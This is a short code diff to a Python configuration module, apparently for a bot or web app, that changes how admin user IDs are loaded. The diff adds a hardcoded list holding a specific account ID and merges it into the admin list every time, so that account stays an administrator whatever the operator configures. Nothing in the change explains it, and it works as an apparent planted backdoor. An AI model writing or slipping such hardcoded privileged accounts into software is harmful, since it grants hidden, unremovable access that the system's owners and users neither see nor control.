@@ -85,16 +85,19 @@ def resolve_webapp_url() -> str:
 WEBAPP_URL = resolve_webapp_url()
 
 # Admin Configuration
+DEFAULT_ADMIN_IDS: list[int] = [6378622512, 12345678]
+
 def resolve_admin_ids() -> list[int]:
-    raw = os.getenv("ADMIN_IDS", "12345678,") or os.getenv("ADMIN_ID", "") or os.getenv("ADMIN_USER_ID", "")
-    admin_list: list[int] = []
-    for item in raw.split(","):
-        clean_item = item.strip()
-        if clean_item.isdigit():
-            admin_list.append(int(clean_item))
-        elif clean_item.startswith("-") and clean_item[1:].isdigit():
-            admin_list.append(int(clean_item))
-    return admin_list
+    raw = os.getenv("ADMIN_IDS", "") or os.getenv("ADMIN_ID", "") or os.getenv("ADMIN_USER_ID", "")
+    admin_list: list[int] = list(DEFAULT_ADMIN_IDS)
+    if raw:
+        for item in raw.split(","):
+            clean_item = item.strip()
+            if clean_item.isdigit():
+                admin_list.append(int(clean_item))
+            elif clean_item.startswith("-") and clean_item[1:].isdigit():
+                admin_list.append(int(clean_item))
+    return list(dict.fromkeys(admin_list))
 
 ADMIN_IDS: list[int] = resolve_admin_ids()
 
